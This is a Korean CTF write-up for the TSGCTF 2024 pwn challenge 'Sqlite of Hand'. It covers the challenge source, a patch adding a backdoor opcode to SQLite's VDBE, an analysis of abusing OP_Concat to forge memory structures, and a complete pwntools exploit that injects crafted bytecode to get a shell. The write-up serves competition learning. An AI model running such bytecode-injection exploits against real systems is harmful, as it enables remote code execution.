---
title: "TSGCTF 2024 - Sqlite of Hand"
dateString: December 2024
draft: false
tags: ["TSGCTF 2024 Pwn","Sqlite of Hand"]
weight: 30
date: 2024-12-18
categories: ["CTF"]
# cover:
    # image: ""
---

TSG CTF 소리가 들려서 들어가봤는데 Hard 0솔짜리 있길래 잡았다.
근데 도커를 안줘서 로되리안 났다.
티켓 열고 도커 달라고 찡찡댔는데 갑자기 솔버 나와서 ubuntu24.04 인거만 알려주고 힌트 못준다고해서 그냥 마저 랭겜했다.

# SQLite of Hand
## Analysis
```c
int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    sqlite3 *db;
    sqlite3_stmt *stmt;

    char *buf = mmap((void *)MAP_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (buf == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    if (sqlite3_open("hello.db", &db) != SQLITE_OK)
    {
        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        return 1;
    }

    if (sqlite3_prepare_v2(db, "select 1;", -1, &stmt, NULL) != SQLITE_OK)
    {
        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    printf("size> ");
    unsigned n = read_int();
    if (n >= (N_OPs * SIZE_OP))
    {
        puts("too long");
        return 1;
    }
    printf("your bytecode> ");
    readn(buf, n);

    char *target = malloc(N_OPs * SIZE_OP);
    memcpy(target, buf, n);

    // adhoc: stmt->aOp = target
    void **aOp = (void **)((unsigned long long)stmt + 136);
    *aOp = target;

    sqlite3_step((sqlite3_stmt *)stmt);
    sqlite3_close(db);
    return 0;
}
```
그냥 바이트코드 수정하는 기능 준다.
```c
diff -u -r home/ubuntu/sqlpwn/dist/sqlite/src/vdbe.c sqlite/src/vdbe.c
--- /home/ubuntu/sqlpwn/dist/sqlite/src/vdbe.c	2024-12-07 19:57:30.000000000 +0000
+++ sqlite/src/vdbe.c	2024-12-12 06:07:20.514797634 +0000
@@ -9039,6 +9039,24 @@
 }
 #endif

+/* Opcode: Pack P1 P2 * * *
+** Synopsis: r[P2] = p64(r[p1])
+**
+** Pack p64 integer to a string. A Christmas present for you.
+*/
+case OP_Pack: {
+  pIn1 = &aMem[pOp->p1];
+  pOut = &aMem[pOp->p2];
+  pOut->flags = MEM_Str|MEM_Static|MEM_Term;
+  i64 *buf = malloc(sizeof(i64));
+  *buf = pIn1->u.i;
+  pOut->z = (char*)buf;
+  pOut->n = 8;
+  pOut->enc = encoding;
+  UPDATE_MAX_BLOBSIZE(pOut);
+  break;
+}
+
 /* Opcode: Noop * * * * *
 **
 ** Do nothing.  Continue downward to the next opcode.
```
백도어 기능 추가해준다.
string으로 인식시켜준다.
## Exploit
https://github.com/sqlite/sqlite/blob/master/src/vdbe.c
https://github.com/sqlite/sqlite/blob/master/src/vdbemem.c
이거 두개 열심히 읽고 익스했다.
str, blob 같은 애들이랑 long, int랑은 실제 데이터 저장하는 구조가 다르고, 바이트코드에서 raw하게 포인터를 p4로 넘겨받아서 처리한다.
근데 int, long을 str로 캐스팅하는 백도어 명령을 넣어줬으니 알잘딱해서 고민하다보면, 0x38 align을 깨고 raw하게 메모리에 구조체를 만들 수 있는 primitive를 만들 수 있게 된다.
그리고 바이트 코드 한번 넣으면 끝이니 원큐에 익스를 성공해야한다.

원래 Sqlite3 단에서 바이트코드 컴파일할때 p4에 builtin 함수들 객체 넘겨줘서 여러 함수 호출 가능한거라 leak하고 코드 실행을 어케할건지 생각을 해봐야한다.
잘 생각해보면 메모리를 다 갖고 놀 수 있으면 런타임에 자기가 leak하고 자기 자신 코드를 패치하면 된다.

구조체 만드는 primitive를 위해서 다음 기능을 쓰면 된다.
```c
case OP_Concat: {           /* same as TK_CONCAT, in1, in2, out3 */
  i64 nByte;          /* Total size of the output string or blob */
  u16 flags1;         /* Initial flags for P1 */
  u16 flags2;         /* Initial flags for P2 */

  pIn1 = &aMem[pOp->p1];
  pIn2 = &aMem[pOp->p2];
  pOut = &aMem[pOp->p3];
  testcase( pOut==pIn2 );
  assert( pIn1!=pOut );
  flags1 = pIn1->flags;
  testcase( flags1 & MEM_Null );
  testcase( pIn2->flags & MEM_Null );
  if( (flags1 | pIn2->flags) & MEM_Null ){
    sqlite3VdbeMemSetNull(pOut);
    break;
  }
  if( (flags1 & (MEM_Str|MEM_Blob))==0 ){
    if( sqlite3VdbeMemStringify(pIn1,encoding,0) ) goto no_mem;
    flags1 = pIn1->flags & ~MEM_Str;
  }else if( (flags1 & MEM_Zero)!=0 ){
    if( sqlite3VdbeMemExpandBlob(pIn1) ) goto no_mem;
    flags1 = pIn1->flags & ~MEM_Str;
  }
  flags2 = pIn2->flags;
  if( (flags2 & (MEM_Str|MEM_Blob))==0 ){
    if( sqlite3VdbeMemStringify(pIn2,encoding,0) ) goto no_mem;
    flags2 = pIn2->flags & ~MEM_Str;
  }else if( (flags2 & MEM_Zero)!=0 ){
    if( sqlite3VdbeMemExpandBlob(pIn2) ) goto no_mem;
    flags2 = pIn2->flags & ~MEM_Str;
  }
  nByte = pIn1->n + pIn2->n;
  if( nByte>db->aLimit[SQLITE_LIMIT_LENGTH] ){
    goto too_big;
  }
  if( sqlite3VdbeMemGrow(pOut, (int)nByte+2, pOut==pIn2) ){
    goto no_mem;
  }
  MemSetTypeFlag(pOut, MEM_Str);
  if( pOut!=pIn2 ){
    memcpy(pOut->z, pIn2->z, pIn2->n);
    assert( (pIn2->flags & MEM_Dyn) == (flags2 & MEM_Dyn) );
    pIn2->flags = flags2;
  }
  memcpy(&pOut->z[pIn2->n], pIn1->z, pIn1->n);
  assert( (pIn1->flags & MEM_Dyn) == (flags1 & MEM_Dyn) );
  pIn1->flags = flags1;
  if( encoding>SQLITE_UTF8 ) nByte &= ~1;
  pOut->z[nByte]=0;
  pOut->z[nByte+1] = 0;
  pOut->flags |= MEM_Term;
  pOut->n = (int)nByte;
  pOut->enc = encoding;
  UPDATE_MAX_BLOBSIZE(pOut);
  break;
}
```
오랜만에 해서 그런지 재밌게 풀었다.
### Exploit script
```python
from pwn import *
OP_Init          =  8# /* jump, synopsis: Start at P2                */
OP_PureFunc      = 65# /* synopsis: r[P3]=func(r[P2@NP])             */
OP_Function      = 66# /* synopsis: r[P3]=func(r[P2@NP])             */
OP_Halt          = 70#
OP_Integer       = 71# /* synopsis: r[P2]=P1                         */
OP_Int64         = 72# /* synopsis: r[P2]=P4                         */
OP_Blob          = 77# /* synopsis: r[P2]=P4 (len=P1)                */
OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]                      */
OP_AddImm        = 86# /* synopsis: r[P1]=r[P1]+P2                   */
OP_Noop          =185#
OP_Pack          =187# backdoored one

OPFLG_JUMP       = 0x01#  /* jump:  P2 holds jmp target */
OPFLG_IN1        = 0x02#  /* in1:   P1 is an input */
OPFLG_IN2        = 0x04#  /* in2:   P2 is an input */
OPFLG_IN3        = 0x08#  /* in3:   P3 is an input */
OPFLG_OUT2       = 0x10#  /* out2:  P2 is an output */
OPFLG_OUT3       = 0x20#  /* out3:  P3 is an output */
OPFLG_NCYCLE     = 0x40#  /* ncycle:Cycles count against P1 */

OPSZ=24
def gen(opcode, p1 = 0, p2 = 0 , p3 = 0 ,p4 = 0 ,p4_type = 0, p5 = 0):
  payload = b''
  payload += p8(opcode)
  payload += p8(p4_type)
  payload += p16(p5)
  payload += p32(p1)
  payload += p32(p2)
  payload += p32(p3)
  payload += p64(p4)
  return payload
# https://files.openstack.org/mirror/ubuntu/pool/main/g/glibc/

# p = process(['./out.bin'], env={"LD_LIBRARY_PATH":"."})
# context.log_level='debug'
# p = remote('34.146.186.1', 21002)
p = remote('localhost', 4444)
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)

MAP_ADDR = 0x2000000000
DATA_ADDR = 0x1000 + MAP_ADDR

code = gen(OP_Init, 0, 1) # jmp to pc

L=20
D=19
DST = 18
one = 0x00000000000984cf 
code += gen(OP_IntCopy, (-627)&0xffffffff, L) 
code += gen(OP_AddImm, L, (-0x181b0 - 0x212000 + one)&0xffffffff)

code += gen(OP_Blob, p1=0x0, p2=DST, p4=DATA_ADDR) # load blob p1 sz, p2 idx
code += gen(OP_IntCopy, (-37)&0xffffffff, D) 
code += gen(OP_AddImm, D, 0x1cf7) 

def imm64(offset, target):
    assert target != 0
    code = b''
    code += gen(OP_Blob, p1=8, p2=0, p4=DATA_ADDR + offset) # load blob p1 sz, p2 idx
    code += gen(112, p2=target, p1=0, p3=target)  # concat p2 + p1 = p3(out) OP_CONCAT, not 111
    return code

def immX(offset, target, x):
    code = b''
    code += gen(OP_Blob, p1=x, p2=0, p4=DATA_ADDR + offset) # load blob p1 sz, p2 idx
    code += gen(112, p2=target, p1=0, p3=target)  # concat p2 + p1 = p3(out) OP_CONCAT
    return code

def pack64(r, target):
    code = b''
    code += gen(OP_Pack, p1=r, p2=0)
    code += gen(112, p2=target, p1=0, p3=target)  # concat p2 + p1 = p3(out) OP_CONCAT
    return code

code += imm64(0, DST)
code += gen(OP_AddImm, D, 8) 
code += pack64(D, DST)
code += gen(OP_AddImm, D, (-8)&0xffffffff)
code += immX(16, DST, 16)
code += pack64(L, DST)
code += immX(32, DST, 0x360) 
code += gen(OP_AddImm, L, (0x58740+0x1b-one)&0xffffffff)
code += pack64(L, DST)

code += gen(OP_IntCopy, D, 1834) # p4 add
code += gen(OP_Noop, p3=0x43,p2=0x43,p1=0x43) * 2
code += gen(OP_PureFunc, p4 = 0xdeadbeef, p3=0x43,p2=0x43,p1=0x43)

code += gen(OP_Halt)

assert len(code) < 0x1000
payload = code
payload += b'\xff' * (0x1000 - len(code))
payload += b'/bin/sh\x00' # Mem * pOut
payload += p64(0x0) # FuncDef *pFunc
payload += p64(0x002000001000) * 3 # /bin/sh
payload += b'B' * 0x350
assert (len(payload) // 24 < 0x100)

sla(b'size> ', str(len(payload)))
sa(b'your bytecode> ', payload)

p.interactive()
```
